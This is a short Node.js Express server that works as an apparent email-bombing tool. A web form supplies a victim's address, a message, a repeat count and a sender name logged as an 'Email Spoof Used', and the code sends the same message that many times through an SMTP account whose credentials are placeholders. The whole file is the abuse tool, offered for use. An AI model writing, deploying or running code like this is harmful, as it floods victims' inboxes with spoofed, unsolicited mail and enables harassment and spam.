var express = require("express");
var smtp = require("nodemailer");
const bodyParser = require("body-parser");
var app = express();
app.use("/", express.static(__dirname));
app.use(bodyParser.urlencoded({extended: true}));

app.post("/sendText", (req, res) => {

    res.redirect(req.get('referer'));

    var amt = parseInt(req.body.int);

    email = smtp.createTransport({
        service: "serice_goes_here ex:(service:'gmail'),",
        auth: {
            user: "email",
            pass: "passwd"
        }
    });

    var sendEMail = {
        from: req.body.uniq + ">:)",
        to: req.body.email,
        subject: "Message for " + req.body.email,
        text: req.body.comm
    };

    function nodeSendMail(verboseMode) {
        email.sendMail(sendEMail, (err, data) => {
            if(err) return console.log(err);
        });
    }

    for(var i = 0; i <= amt; i++){
        nodeSendMail(true);
    }
    console.log("user with " + req.ip + " sent the message:\n" + req.body.comm + "\n\nAmount: " + amt + " Time(s)\nEmail: " + req.body.email +"\nEmail Spoof Used: " + req.body.uniq);

});
port = 8283;
app.listen(port, () => {
    console.log("Unlocked, server has been activated\nport: " + port);
});